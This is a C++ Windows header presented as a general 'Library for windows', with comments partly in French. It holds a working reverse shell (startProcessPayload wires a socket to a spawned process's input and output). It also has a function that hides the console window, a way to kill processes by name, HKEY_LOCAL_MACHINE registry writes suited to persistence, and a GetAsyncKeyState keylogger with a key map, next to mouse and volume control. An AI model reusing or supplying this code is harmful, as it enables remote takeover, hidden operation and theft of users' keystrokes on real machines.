//coded by Sud0ck3rs
//Library for windows
#ifndef SYSTEM_H
#define SYSTEM_H

#include <winsock2.h>   //ws2_32.lib
#include <Windows.h>
#include <winnt.h>
#include <iphlpapi.h>
#include <process.h>
#include <Tlhelp32.h>
#include <winbase.h>
#include <chrono>
#include <ctime>
#include <sstream>
#include <string>
#include <iostream>
#include <cstdlib>
#include <cstdio>
#include <array>
#include <iomanip>
#include <map>
#include <random>
#include <cmath>

namespace subprocess
{
    class Process
    {
        public:
            Process():
                cmd_Shell(""), result_Shell("")
            {

            }

            ~Process()
            {
                auto returnCode = pclose(pipe);
            }

            auto start(std::string cmd)
            {
                cmd_Shell = cmd;
                pipe = popen(cmd_Shell.c_str(), "r");
                if (!pipe)
                {
                    std::cerr << "Couldn't start command." << std::endl;
                    return 0;
                }
                while (fgets(buffer.data(), 128, pipe) != NULL) {
                    result_Shell += buffer.data();
                }
                auto returnCode = pclose(pipe);
                return returnCode;
            }

            bool startProcessPayload(std::string ip, int port, std::string cmd)
            {
                Sleep(5000);
                WSADATA wsaData;

                // Call WSAStartup()
                int WSAStartup_Result = WSAStartup(MAKEWORD(2,2), &wsaData);
                if (WSAStartup_Result != 0) {
                    std::cout << "[-] WSAStartup failed." << std::endl;
                    return false;
                }
                else
                {
                    // Call WSASocket()
                    SOCKET mysocket = WSASocketA(2, 1, 6, NULL, 0, 0); 

                    // Create sockaddr_in struct
                    struct sockaddr_in sa;
                    sa.sin_family = AF_INET;
                    sa.sin_addr.s_addr = inet_addr(ip.c_str());
                    sa.sin_port = htons(port);

                    // Call connect()
                    int connect_Result = connect(mysocket, (struct sockaddr*) &sa, sizeof(sa));
                    if (connect_Result != 0) {
                        std::cout << "[-] connect failed." << std::endl;
                        return false;
                    }
                    else
                    {
                        // Call CreateProcessA()
                        STARTUPINFO si;
                        memset(&si, 0, sizeof(si));
                        si.cb = sizeof(si);
                        si.dwFlags = (STARTF_USESTDHANDLES);
                        si.hStdInput = (HANDLE)mysocket;
                        si.hStdOutput = (HANDLE)mysocket;
                        si.hStdError = (HANDLE)mysocket;
                        PROCESS_INFORMATION pi;
                        CreateProcessA(NULL, LPSTR(cmd.c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
                        return true;
                    }
                }
            }

            std::string Stdout()
            {
                return result_Shell;
            }

            void killProcessByName(std::string filename)
            {
                HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
                PROCESSENTRY32 pEntry;
                pEntry.dwSize = sizeof (pEntry);
                BOOL hRes = Process32First(hSnapShot, &pEntry);
                while (hRes)
                {
                    if (strcmp(pEntry.szExeFile, filename.c_str()) == 0)
                    {
                        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, 0,
                                                    (DWORD) pEntry.th32ProcessID);
                        if (hProcess != NULL)
                        {
                            TerminateProcess(hProcess, 9);
                            CloseHandle(hProcess);
                        }
                    }
                    hRes = Process32Next(hSnapShot, &pEntry);
                }
                CloseHandle(hSnapShot);
            }

            void stealth()
            {
                HWND stealth;
                AllocConsole();
                stealth = FindWindowA("ConsoleWindowClass", NULL);
                MoveWindow(stealth,-300,-700,0,0,TRUE);
                ShowWindow(stealth,0);
                SetPriorityClass(GetCurrentProcess(),HIGH_PRIORITY_CLASS);
            }

        private:
            std::string cmd_Shell;
            std::string result_Shell;
            std::array<char, 128> buffer;
            bool check_Pipe;
            FILE *pipe;
    };
}

namespace OS
{
    class System
    {
        public:
            System()
            {
                std::time( &currentTime );
                localTime = localtime( &currentTime );
            }

            ~System()
            {

            }
            bool add_Registry_HKEY_LOCAL_MACHINE(std::string path_Registry, std::string name_Key, std::string value_Key)
            {
                HKEY key;
                if (RegOpenKey(HKEY_LOCAL_MACHINE, TEXT(path_Registry.c_str()), &key) != ERROR_SUCCESS)   //open registry
                {
                    std::cout << "Unable to open registry key";
                    return false;
                }
                if (RegSetValueEx(key, TEXT(name_Key.c_str()), 0, REG_SZ, (LPBYTE)value_Key.c_str(), strlen(value_Key.c_str())*sizeof(char)) != ERROR_SUCCESS)   //edit registry key
                {
                    RegCloseKey(key);
                    std::cout <<"Unable to set registry value value_name";
                    return false;
                }
                else
                {
                    return true;
                }
            }

            std::string get_Size_Screen(int x_Index, int y_Index) //SM_CXSCREEN SM_CYSCREEN
            {
                std::stringstream ss;
                std::string sizeScreen = "";
                int x = GetSystemMetrics(x_Index);
                int y = GetSystemMetrics(y_Index);
                ss << "(" << x << ", " << y << ")";
                sizeScreen = ss.str();
                ss.clear();
                return sizeScreen;
            }

            int get_Size_Screen_X(int x_Index) //SM_CXSCREEN
            {
                int x = GetSystemMetrics(x_Index);
                return x;
            }

            int get_Size_Screen_Y(int y_Index) //SM_CYSCREEN
            {
                int y = GetSystemMetrics(y_Index);
                return y;
            }

            void move_Cursor_Position(int x, int y, time_t msTimeout = 0)   // x & y position souhaité
            {
                if(msTimeout == 0)
                    SetCursorPos(x, y);
                else
                {
                    int x_Active = this->get_Cursor_Position_X();   //position x  actuelle
                    int y_Active = this->get_Cursor_Position_Y();   //position y actuelle
                    time_t timeout;
                    bool running = true;

                    std::cout << "x_Active: " << x_Active << " y_Active: " << y_Active << " x: " << x << " y: " << y << std::endl;

                    if(x_Active < x && y_Active < y) // on incremente x_Active et y_Active
                    {
                        while(running)
                        {
                            if(x_Active < x)
                                x_Active++;
        
                            if(y_Active < y)
                                y_Active++;
                            
                            std::cout << "x: " << x_Active << " y: " << y_Active << std::endl;
                            if(x_Active == x && y_Active == y)
                                running = false;
                            else
                                SetCursorPos(x_Active, y_Active);
                        }
                    }
                    else if(x_Active > x && y_Active > y)  //on desincremente x_Active et y_Active
                    {
                        while(running)
                        {
                            if(x_Active > x)
                                x_Active--;
            
                            if(y_Active > y)
                                y_Active--;

                            std::cout << "x: " << x_Active << " y: " << y_Active << std::endl;
                            if(x_Active == x && y_Active == y)
                                running = false;
                            else
                                SetCursorPos(x_Active, y_Active);
                        }
                    }
                    else if(x_Active < x && y_Active > y)  //on incremente x_Active et desincremente y_Active
                    {
                        while(running)
                        {
                            while(running)
                            {
                                if(x_Active < x)
                                    x_Active++;
                
                                if(y_Active > y)
                                    y_Active--;

                                std::cout << "x: " << x_Active << " y: " << y_Active << std::endl;
                                if(x_Active == x && y_Active == y)
                                    running = false;
                                else
                                    SetCursorPos(x_Active, y_Active);
                            }
                        }
                    }
                    else if(x_Active > x && y_Active < y)  //on desincremente x_Active et incremente y_Active
                    {
                        while(running)
                        {
                            while(running)
                            {
                                if(x_Active > x)
                                    x_Active--;
                
                                if(y_Active < y)
                                    y_Active++;

                                std::cout << "x: " << x_Active << " y: " << y_Active << std::endl;
                                if(x_Active == x && y_Active == y)
                                    running = false;
                                else
                                    SetCursorPos(x_Active, y_Active);
                            }
                        }
                    }
                }
            }
            
            std::string get_Cursor_Position()
            {
                std::stringstream ss;
                POINT p;
                GetCursorPos(&p);
                ss << "(" << p.x << ", " << p.y << ")";
                std::string out_Str = ss.str();
                return out_Str;
            }

            int get_Cursor_Position_X()
            {
                POINT p;
                int x_Cursor(0);
                GetCursorPos(&p);
                x_Cursor = p.x;
                return x_Cursor;
            }

            int get_Cursor_Position_Y()
            {
                POINT p;
                int y_Cursor(0);
                GetCursorPos(&p);
                y_Cursor = p.y;
                return y_Cursor;
            }

            void click_Cursor_Left()
            {
                // simulation d'un double clic gauche
                mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0); // Appuie bouton gauche
                Sleep(1);        // Pour pas aller trop vite ^^
                mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); // Relache bouton gauche
            }

            void click_Cursor_Right()
            {
                mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0); // Appuie bouton droit
                Sleep(1);       
                mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0); // Relache bouton droit
            }

            void press_Cursor_Left()
            {
                mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0); // Appuie bouton gauche
            }

            void release_Cursor_Left()
            {
                mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); // Relache bouton gauche
            }

            void press_Cursor_Right()
            {
                mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0); // Appuie bouton droit
            }

            void release_Cursor_Right()
            {
                mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0); // Relache bouton droit
            }

            std::string listen_Keyboard()
            {
                for (int key = 8; key <= 190; key++)
                {
                    if (GetAsyncKeyState(key) == -32767)
                    {
                        return checking_Caracter(key);
                    }
                }
                return "";
            }

            void UP_Volume(int volume)
            {
                for(int i(0); i < volume; i+=2)
                {
                    INPUT ip={0};
                    ip.type = INPUT_KEYBOARD;
                    ip.ki.wVk = VK_VOLUME_UP;   //or VOLUME_DOWN or MUTE
                    SendInput(1, &ip, sizeof(INPUT));
                    ip.ki.dwFlags = KEYEVENTF_KEYUP;
                    SendInput(1, &ip, sizeof(INPUT));
                }
            }

            void DOWN_Volume(int volume)
            {
                for(int i(0); i < volume; i+=2)
                {
                    INPUT ip={0};
                    ip.type = INPUT_KEYBOARD;
                    ip.ki.wVk = VK_VOLUME_DOWN;   //or VOLUME_DOWN or MUTE
                    SendInput(1, &ip, sizeof(INPUT));
                    ip.ki.dwFlags = KEYEVENTF_KEYUP;
                    SendInput(1, &ip, sizeof(INPUT));
                }
            }

            void MUTE_Volume()
            {
                INPUT ip={0};
                ip.type = INPUT_KEYBOARD;
                ip.ki.wVk = VK_VOLUME_MUTE;   //or VOLUME_DOWN or MUTE
                SendInput(1, &ip, sizeof(INPUT));
                ip.ki.dwFlags = KEYEVENTF_KEYUP;
                SendInput(1, &ip, sizeof(INPUT));
            }

            std::string get_OS_Time()
            {
                std::stringstream ss;
                int Hours(0);
                int Min(0);
                int Sec(0);
                Hours = localTime->tm_hour;
                Min = localTime->tm_min;
                Sec = localTime->tm_sec;
                ss << Hours << ":" << Min << ":" << Sec;
                std::string out_Str = ss.str();
                return out_Str;
            }

            int get_OS_Hours()
            {
                int Hours(0);
                Hours = localTime->tm_hour;
                return Hours;
            }

            int get_OS_Minutes()
            {
                int Min(0);
                Min = localTime->tm_min;
                return Min;
            }

            int get_OS_Seconds()
            {
                int Sec(0);
                Sec = localTime->tm_sec;
                return Sec;
            }

            int int_Random(int min = 0, int max = 10)
            {
                std::random_device r;
                std::default_random_engine e1(r());
                std::uniform_int_distribution<int> uniform_dist(min, max);
                int mean = uniform_dist(e1);
                return mean;
            }

        private:
            time_t currentTime;
            struct tm *localTime;
            std::string checking_Caracter(int Key) 
            {
                switch (Key) 
                {
                    case VK_SPACE: return" ";
                    case VK_RETURN: return "\n";
                    case VK_SHIFT: return "[SHIFT]";
                    case VK_BACK: return "\b";
                    case VK_RBUTTON: return "[R_CLICK]";
                    case VK_CAPITAL: return "[CAPS_LOCK]";
                    case VK_TAB: return "[TAB]";
                    case VK_UP: return "[UP]";
                    case VK_DOWN: return "[DOWN]";
                    case VK_LEFT: return "[LEFT]";
                    case VK_RIGHT: return "[RIGHT]";
                    case VK_CONTROL: return "[CTRL]";
                    case VK_MENU: return "[ALT]";
                    case VK_NUMPAD0: return "0";
                    case VK_NUMPAD1: return "1";
                    case VK_NUMPAD2: return "2";  
                    case VK_NUMPAD3: return "3";
                    case VK_NUMPAD4: return "4";
                    case VK_NUMPAD5: return "5";
                    case VK_NUMPAD6: return "6";
                    case VK_NUMPAD7: return "7";
                    case VK_NUMPAD8: return "8";
                    case VK_NUMPAD9: return "9";
                    case VK_ADD: return "+";
                    case VK_SUBTRACT: return "-";
                    case VK_DIVIDE: return "/";
                    case VK_MULTIPLY: return "*";
                    case 110: return ".";
                    case 188: return "<";
                    case 189: return "_";
                    case 190: return ">";
                    case 191: return "?";
                    case 192: return "~";
                    case 219: return "{";
                    case 220: return "|";
                    case 221: return "}";
                    case 222: return std::string(1, '"');
                    case '1' : return "!";
                    case '2' : return "@";
                    case '3' : return "#";
                    case '4' : return "$";
                    case '5' : return "%";
                    case '6' : return "^";
                    case '7' : return "&";
                    case '8' : return "*";
                    case '9' : return "(";
                    case '0' : return ")";
                }
                if(GetKeyState(VK_CAPITAL))
                    return std::string(1, char(Key));
                else
                    return std::string(1, tolower(char(Key)));
            }
        
    };
}

#endif